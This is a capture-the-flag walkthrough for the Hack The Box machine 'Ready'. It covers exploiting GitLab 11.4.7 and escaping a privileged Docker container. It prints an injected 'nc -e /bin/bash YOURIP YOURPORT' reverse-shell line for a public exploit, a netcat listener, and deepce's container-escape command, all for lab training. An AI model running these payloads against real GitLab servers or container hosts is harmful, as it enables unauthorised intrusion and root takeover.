### Port Scanning and General Enumeration (Nmap)
* Reading/Resources
  * [Nmap manual](https://nmap.org/book/man.html)

`nmap -sV -sC -oN nmap/initial -T4 10.10.10.220`

22 and ..5080?

**Gitlab!**

### Access (searchsploit, gitlab)
* Reading/Resources
  * [searchsploit](https://www.exploit-db.com/searchsploit)
  * [gitlab](https://about.gitlab.com/)

Let's see what version of **Gitlab** we're working with

1. `top right, drop down menu`
2. `help`

Gitlab version **11.4.7**

Checking **searchsploit** for public exploits for **Gitlab 11.4.7**

I used the first one but it requires a bit of editing. Here's what I added:

```python
open(\\'|""" + f'nc -e /bin/bash YOURIP YOURPORT' + """ \\').read\\"]
```

The original wouldn't work, this one should. (replace *YOURIP* and *YOURPORT* with your listening ip and port, respectively)

Start a listener

`nc -lvnp 4444`

And run the script!

`python3 exploit.py -u YOURUSERNAME -p YOURPASSWORD -g http://10.10.10.220 -l YOURIP -p YOUR PORT`

### Privesc Part 1 (password-reuse, linpeas)
* Reading/Resources
	* [linpeas]()

**Linpeas** kicks back a *lot* of juicy informtion, but this box has some curveballs and 90% of it is irrelevant for the completion of this box. This is definitely a case of **K.I.S.S.**

> **K.I.S.S.**

Main two things we're after here:

*keep that in mind for later*

First thing you should *always* do when you find a plaintext password? Use it! Use it everywhere!

Turns out..

Let's capture the root fla---

Well, let's try and escape the docker then!

### Privesc Part 2: ESCAPE-trick boogaloo (deepce, docker escape)
* Reading/Resources
	* [deepce](https://github.com/stealthcopter/deepce)
	* [Escaping Docker Containers](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

First things first when trying to do anything: **Enumeration**. We'll be using **deepce**. It's very similar to **Linpeas**. It's *amazing*.

The interesting finding:


![img](/assets/images/htb/ready/11.png)

Running a container as **privileged** gives us the ability to execute commands as root.

The other cool feature of **deepce** is it has an **exploit** mode

`./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce`

*you can read about the available exploits by following the link above in **Reading/Resources***

All that's left to do is **ssh** in as the new root user!
